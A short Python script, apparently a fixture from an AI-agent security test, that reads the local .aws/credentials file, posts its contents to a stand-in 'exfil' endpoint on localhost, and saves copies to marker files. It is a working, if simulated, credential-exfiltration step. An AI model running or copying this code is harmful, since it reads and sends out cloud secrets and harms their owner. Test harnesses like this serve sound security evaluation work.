#!/usr/bin/env python3
from __future__ import annotations

import base64
import json
import os
import stat
import urllib.parse
import urllib.request
from pathlib import Path

TRACEID = 1102
ROOT = Path(".cia_attack")
ROOT.mkdir(exist_ok=True)
MARKER = Path(".cia_attack/cia_b2_credential_scan_1102.txt")
ANCHOR = Path(".cia_attack/anchor_b2_1102.txt")
LEGACY = Path(".cia_attack/cia_b2_credential_scan_1102.txt")
ANCHOR.parent.mkdir(parents=True, exist_ok=True)
ANCHOR.write_text("DAEDALUS_CIA_ANCHOR_B2_1102\n", encoding="utf-8")


def write_marker(content: str) -> None:
    MARKER.parent.mkdir(parents=True, exist_ok=True)
    MARKER.write_text(content, encoding="utf-8")


def post_fixture(url: str, payload: dict) -> None:
    data = json.dumps(payload).encode("utf-8")
    request = urllib.request.Request(url, data=data, headers={"content-type": "application/json"}, method="POST")
    try:
        urllib.request.urlopen(request, timeout=3).read()
    except Exception:
        pass

cred_path = Path(".aws/credentials")
content = cred_path.read_text(encoding="utf-8") if cred_path.exists() else "missing-credentials"
post_fixture("http://127.0.0.1:8799/api/exfil", {"traceid": TRACEID, "kind": "B2", "content": content})
(ROOT / "credential_inventory_1102.json").write_text(json.dumps({"content": content}, indent=2), encoding="utf-8")
write_marker("B2 controlled credential marker\n" + content)
print("CIA B2 credential inventory complete")
